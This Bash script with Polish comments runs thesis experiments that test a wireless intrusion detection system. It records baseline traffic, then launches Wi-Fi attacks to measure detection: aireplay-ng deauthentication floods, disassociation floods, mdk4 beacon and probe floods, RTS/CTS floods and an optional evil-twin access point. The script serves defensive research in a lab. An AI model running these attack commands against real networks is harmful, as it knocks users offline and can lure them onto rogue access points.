#!/usr/bin/env bash
set -euo pipefail

# ============================================================
# ZBIORCZY RUNNER EKSPERYMENTÓW DO PRACY MAGISTERSKIEJ
# ============================================================
#
# Uruchamiaj z katalogu głównego projektu:
#
#   sudo -E bash scripts/run_all_lab_experiments.sh
#
# Wcześniej ustaw zmienne:
#
#   export IFACE="wlan0mon"
#   export AP_BSSID="AA:BB:CC:DD:EE:FF"
#   export CLIENT_MAC="FF:FF:FF:FF:FF:FF"
#   export CHANNEL="6"
#
# Opcjonalnie:
#
#   export RUN_RTS_CTS="1"
#   export RUN_EVIL_TWIN="0"
#
# Test próbny:
#
#   export BASELINE_SECONDS=20
#   export PRE_SECONDS=10
#   export ATTACK_SECONDS=10
#   export POST_SECONDS=10
#   export PAUSE_BETWEEN_TESTS=5
#
# ============================================================


# ----------------------------
# Konfiguracja podstawowa
# ----------------------------

IFACE="${IFACE:-wlan0mon}"
AP_BSSID="${AP_BSSID:-}"
CLIENT_MAC="${CLIENT_MAC:-FF:FF:FF:FF:FF:FF}"
CHANNEL="${CHANNEL:-6}"

# Czas eksperymentów
BASELINE_SECONDS="${BASELINE_SECONDS:-300}"

PRE_SECONDS="${PRE_SECONDS:-120}"
ATTACK_SECONDS="${ATTACK_SECONDS:-60}"
POST_SECONDS="${POST_SECONDS:-120}"

# Przerwa między eksperymentami
PAUSE_BETWEEN_TESTS="${PAUSE_BETWEEN_TESTS:-10}"

# Włączanie/wyłączanie wybranych grup testów
RUN_BASELINE="${RUN_BASELINE:-1}"
RUN_DEAUTH="${RUN_DEAUTH:-1}"
RUN_DISASSOC="${RUN_DISASSOC:-1}"
RUN_BEACON="${RUN_BEACON:-1}"
RUN_PROBE="${RUN_PROBE:-1}"
RUN_RTS_CTS="${RUN_RTS_CTS:-1}"
RUN_EVIL_TWIN="${RUN_EVIL_TWIN:-0}"

# Evil Twin — opcjonalnie
AP_IFACE="${AP_IFACE:-wlan1}"
EVIL_CHANNEL="${EVIL_CHANNEL:-11}"
TEST_SSID="${TEST_SSID:-}"


# ----------------------------
# Pliki zbiorcze
# ----------------------------

mkdir -p data/pcaps data/logs data/notes data/attack_inputs

MASTER_TS="$(date +%Y%m%d_%H%M%S)"
MASTER_NOTE="data/notes/run_all_${MASTER_TS}.md"
MASTER_LOG="data/logs/run_all_${MASTER_TS}.log"


# ----------------------------
# Funkcje pomocnicze
# ----------------------------

log() {
  local msg="$1"
  echo "[$(date --iso-8601=seconds)] $msg" | tee -a "$MASTER_LOG"
}

write_master_note_header() {
  {
    echo "# Zbiorcze uruchomienie eksperymentów"
    echo ""
    echo "MASTER_TS=${MASTER_TS}"
    echo "IFACE=${IFACE}"
    echo "AP_BSSID=${AP_BSSID}"
    echo "CLIENT_MAC=${CLIENT_MAC}"
    echo "CHANNEL=${CHANNEL}"
    echo "BASELINE_SECONDS=${BASELINE_SECONDS}"
    echo "PRE_SECONDS=${PRE_SECONDS}"
    echo "ATTACK_SECONDS=${ATTACK_SECONDS}"
    echo "POST_SECONDS=${POST_SECONDS}"
    echo "PAUSE_BETWEEN_TESTS=${PAUSE_BETWEEN_TESTS}"
    echo ""
    echo "RUN_BASELINE=${RUN_BASELINE}"
    echo "RUN_DEAUTH=${RUN_DEAUTH}"
    echo "RUN_DISASSOC=${RUN_DISASSOC}"
    echo "RUN_BEACON=${RUN_BEACON}"
    echo "RUN_PROBE=${RUN_PROBE}"
    echo "RUN_RTS_CTS=${RUN_RTS_CTS}"
    echo "RUN_EVIL_TWIN=${RUN_EVIL_TWIN}"
    echo ""
    echo "Start ISO: $(date --iso-8601=ns)"
    echo "Start epoch: $(date +%s.%N)"
    echo ""
    echo "## Wykonane eksperymenty"
    echo ""
  } > "$MASTER_NOTE"
}

append_master_note() {
  local run_name="$1"
  local scenario="$2"

  {
    echo "### ${run_name}"
    echo ""
    echo "Scenario: ${scenario}"
    echo "PCAP: data/pcaps/${run_name}.pcap"
    echo "CSV: data/logs/${run_name}_frames.csv"
    echo "JSONL: data/logs/${run_name}_alerts.jsonl"
    echo "STDOUT: data/logs/${run_name}_stdout.log"
    echo "NOTE: data/notes/${run_name}.md"
    echo ""
  } >> "$MASTER_NOTE"
}

require_root() {
  if [ "${EUID}" -ne 0 ]; then
    echo "[!] Ten skrypt uruchom przez sudo:"
    echo "    sudo -E bash scripts/run_all_lab_experiments.sh"
    exit 1
  fi
}

require_var() {
  local name="$1"
  local value="$2"

  if [ -z "$value" ]; then
    echo "[!] Brakuje wymaganej zmiennej: $name"
    echo "    Przykład:"
    echo "    export $name=\"wartosc\""
    exit 1
  fi
}

require_file() {
  local path="$1"

  if [ ! -f "$path" ]; then
    echo "[!] Brakuje pliku: $path"
    exit 1
  fi
}

require_command() {
  local cmd="$1"

  if ! command -v "$cmd" >/dev/null 2>&1; then
    echo "[!] Brakuje komendy: $cmd"
    exit 1
  fi
}

set_channel() {
  log "Ustawianie kanału ${CHANNEL} na interfejsie ${IFACE}"
  iw dev "$IFACE" set channel "$CHANNEL" || true
  sleep 2
}

kill_leftover_wids() {
  local leftovers

  leftovers="$(pgrep -af "python.*main.py" || true)"

  if [ -n "$leftovers" ]; then
    log "[!] Znaleziono wiszące procesy WIDS przed/po teście:"
    echo "$leftovers" | tee -a "$MASTER_LOG"

    log "[!] Próba zatrzymania wiszących procesów WIDS..."
    pkill -INT -f "python.*main.py" || true
    sleep 3

    if pgrep -af "python.*main.py" >/dev/null 2>&1; then
      log "[!] WIDS dalej działa, wysyłam TERM..."
      pkill -TERM -f "python.*main.py" || true
      sleep 2
    fi

    if pgrep -af "python.*main.py" >/dev/null 2>&1; then
      log "[!] WIDS dalej działa, wysyłam KILL..."
      pkill -KILL -f "python.*main.py" || true
      sleep 1
    fi
  fi
}

cleanup_all() {
  log "[!] Cleanup zbiorczy: zatrzymywanie ewentualnych procesów WIDS..."
  kill_leftover_wids
}

pause_between_tests() {
  log "Przerwa ${PAUSE_BETWEEN_TESTS}s przed kolejnym testem..."
  sleep "$PAUSE_BETWEEN_TESTS"
}

check_outputs() {
  local run_name="$1"

  log "Sprawdzanie plików wynikowych dla ${run_name}"

  ls -lh \
    "data/pcaps/${run_name}.pcap" \
    "data/logs/${run_name}_frames.csv" \
    "data/logs/${run_name}_alerts.jsonl" \
    "data/logs/${run_name}_stdout.log" \
    "data/notes/${run_name}.md" | tee -a "$MASTER_LOG" || true

  log "Liczba linii CSV:"
  wc -l "data/logs/${run_name}_frames.csv" | tee -a "$MASTER_LOG" || true

  log "Liczba alertów:"
  wc -l "data/logs/${run_name}_alerts.jsonl" | tee -a "$MASTER_LOG" || true
}

run_baseline() {
  local run_name="$1"

  log "START baseline: ${run_name}"
  append_master_note "$run_name" "baseline"

  set_channel
  kill_leftover_wids

  bash scripts/run_baseline_experiment.sh "$run_name" "$IFACE" "$BASELINE_SECONDS" | tee -a "$MASTER_LOG"

  kill_leftover_wids
  check_outputs "$run_name"
  pause_between_tests

  log "KONIEC baseline: ${run_name}"
}

run_attack() {
  local run_name="$1"
  local scenario="$2"
  local attack_command="$3"

  log "START ${scenario}: ${run_name}"
  append_master_note "$run_name" "$scenario"

  set_channel
  kill_leftover_wids

  bash scripts/run_attack_experiment.sh "$run_name" "$IFACE" "$PRE_SECONDS" "$ATTACK_SECONDS" "$POST_SECONDS" "$attack_command" | tee -a "$MASTER_LOG"

  kill_leftover_wids
  check_outputs "$run_name"
  pause_between_tests

  log "KONIEC ${scenario}: ${run_name}"
}


# ----------------------------
# Trap / cleanup
# ----------------------------

trap cleanup_all EXIT INT TERM


# ----------------------------
# Walidacja
# ----------------------------

require_root

require_var "AP_BSSID" "$AP_BSSID"

require_file "main.py"
require_file "scripts/run_attack_experiment.sh"
require_file "scripts/run_baseline_experiment.sh"

require_command "python"
require_command "python3"
require_command "iw"
require_command "pkill"
require_command "pgrep"
require_command "timeout"

if [ "$RUN_DEAUTH" = "1" ]; then
  require_command "aireplay-ng"
fi

if [ "$RUN_BEACON" = "1" ]; then
  require_command "mdk4"
  require_file "data/attack_inputs/beacon_ssids.txt"
fi

if [ "$RUN_PROBE" = "1" ]; then
  require_command "mdk4"
  require_file "data/attack_inputs/probe_ssids.txt"
fi

if [ "$RUN_DISASSOC" = "1" ]; then
  require_file "tools/disassoc_flood.py"
fi

if [ "$RUN_RTS_CTS" = "1" ]; then
  require_file "tools/rts_cts_flood.py"
fi

if [ "$RUN_EVIL_TWIN" = "1" ]; then
  require_command "hostapd"
  require_var "TEST_SSID" "$TEST_SSID"
fi


# ----------------------------
# Start
# ----------------------------

write_master_note_header

log "============================================================"
log "START ZBIORCZEGO URUCHOMIENIA EKSPERYMENTÓW"
log "MASTER_NOTE=${MASTER_NOTE}"
log "MASTER_LOG=${MASTER_LOG}"
log "============================================================"

log "Konfiguracja:"
log "IFACE=${IFACE}"
log "AP_BSSID=${AP_BSSID}"
log "CLIENT_MAC=${CLIENT_MAC}"
log "CHANNEL=${CHANNEL}"
log "BASELINE_SECONDS=${BASELINE_SECONDS}"
log "PRE_SECONDS=${PRE_SECONDS}"
log "ATTACK_SECONDS=${ATTACK_SECONDS}"
log "POST_SECONDS=${POST_SECONDS}"
log "PAUSE_BETWEEN_TESTS=${PAUSE_BETWEEN_TESTS}"

log "Upewnij się, że testujesz wyłącznie własną sieć laboratoryjną."
sleep 3


# ----------------------------
# Baseline
# ----------------------------

if [ "$RUN_BASELINE" = "1" ]; then
  run_baseline "baseline_01"
  run_baseline "baseline_02"
  run_baseline "baseline_03"
fi


# ----------------------------
# Deauthentication Flood
# ----------------------------

if [ "$RUN_DEAUTH" = "1" ]; then
  run_attack "deauth_01" "Deauthentication Flood" \
    "aireplay-ng --deauth 0 -a $AP_BSSID -c $CLIENT_MAC $IFACE"

  run_attack "deauth_02" "Deauthentication Flood" \
    "aireplay-ng --deauth 0 -a $AP_BSSID -c $CLIENT_MAC $IFACE"

  run_attack "deauth_03" "Deauthentication Flood" \
    "aireplay-ng --deauth 0 -a $AP_BSSID -c $CLIENT_MAC $IFACE"
fi


# ----------------------------
# Disassociation Flood
# ----------------------------

if [ "$RUN_DISASSOC" = "1" ]; then
  run_attack "disassoc_01" "Disassociation Flood" \
    "python3 tools/disassoc_flood.py $IFACE $AP_BSSID $CLIENT_MAC $ATTACK_SECONDS 0.05"

  run_attack "disassoc_02" "Disassociation Flood" \
    "python3 tools/disassoc_flood.py $IFACE $AP_BSSID $CLIENT_MAC $ATTACK_SECONDS 0.05"

  run_attack "disassoc_03" "Disassociation Flood" \
    "python3 tools/disassoc_flood.py $IFACE $AP_BSSID $CLIENT_MAC $ATTACK_SECONDS 0.05"
fi


# ----------------------------
# Beacon Flood
# ----------------------------

if [ "$RUN_BEACON" = "1" ]; then
  run_attack "beacon_flood_01" "Beacon Flood" \
    "mdk4 $IFACE b -f data/attack_inputs/beacon_ssids.txt -c $CHANNEL -s 100"

  run_attack "beacon_flood_02" "Beacon Flood" \
    "mdk4 $IFACE b -f data/attack_inputs/beacon_ssids.txt -c $CHANNEL -s 100"

  run_attack "beacon_flood_03" "Beacon Flood" \
    "mdk4 $IFACE b -f data/attack_inputs/beacon_ssids.txt -c $CHANNEL -s 100"
fi


# ----------------------------
# Probe Flood
# ----------------------------
#
# UWAGA:
# Ta wersja używa MDK4, a nie tools/probe_flood.py.
# Jeżeli Twoja wersja mdk4 ma inną składnię trybu probe,
# sprawdź:
#
#   mdk4 --help
#   mdk4 "$IFACE" p --help
#
# i ewentualnie zmień tylko komendę poniżej.
# ----------------------------

if [ "$RUN_PROBE" = "1" ]; then
  run_attack "probe_flood_01" "Probe Flood" \
    "mdk4 $IFACE p -f data/attack_inputs/probe_ssids.txt"

  run_attack "probe_flood_02" "Probe Flood" \
    "mdk4 $IFACE p -f data/attack_inputs/probe_ssids.txt"

  run_attack "probe_flood_03" "Probe Flood" \
    "mdk4 $IFACE p -f data/attack_inputs/probe_ssids.txt"
fi


# ----------------------------
# RTS/CTS Flood
# ----------------------------

if [ "$RUN_RTS_CTS" = "1" ]; then
  run_attack "rts_cts_01" "RTS/CTS Flood mixed" \
    "python3 tools/rts_cts_flood.py $IFACE $AP_BSSID $ATTACK_SECONDS 0.01 mixed"

  run_attack "rts_cts_02" "RTS Flood source" \
    "python3 tools/rts_cts_flood.py $IFACE $AP_BSSID $ATTACK_SECONDS 0.01 rts"

  run_attack "rts_cts_03" "RTS/CTS Flood mixed" \
    "python3 tools/rts_cts_flood.py $IFACE $AP_BSSID $ATTACK_SECONDS 0.01 mixed"
fi


# ----------------------------
# Evil Twin / Rogue AP — opcjonalnie
# ----------------------------

if [ "$RUN_EVIL_TWIN" = "1" ]; then
  cat > data/attack_inputs/evil_twin_hostapd.conf <<EOF
interface=$AP_IFACE
driver=nl80211
ssid=$TEST_SSID
hw_mode=g
channel=$EVIL_CHANNEL
auth_algs=1
ignore_broadcast_ssid=0
EOF

  run_attack "evil_twin_01" "Evil Twin / Rogue AP" \
    "hostapd data/attack_inputs/evil_twin_hostapd.conf"

  run_attack "evil_twin_02" "Evil Twin / Rogue AP" \
    "hostapd data/attack_inputs/evil_twin_hostapd.conf"
fi


# ----------------------------
# Koniec
# ----------------------------

{
  echo ""
  echo "Koniec ISO: $(date --iso-8601=ns)"
  echo "Koniec epoch: $(date +%s.%N)"
} >> "$MASTER_NOTE"

log "============================================================"
log "KONIEC ZBIORCZEGO URUCHOMIENIA EKSPERYMENTÓW"
log "MASTER_NOTE=${MASTER_NOTE}"
log "MASTER_LOG=${MASTER_LOG}"
log "============================================================"

log "Sprawdzenie, czy nie wiszą procesy WIDS:"
pgrep -af "python.*main.py" | tee -a "$MASTER_LOG" || true

log "Gotowe."
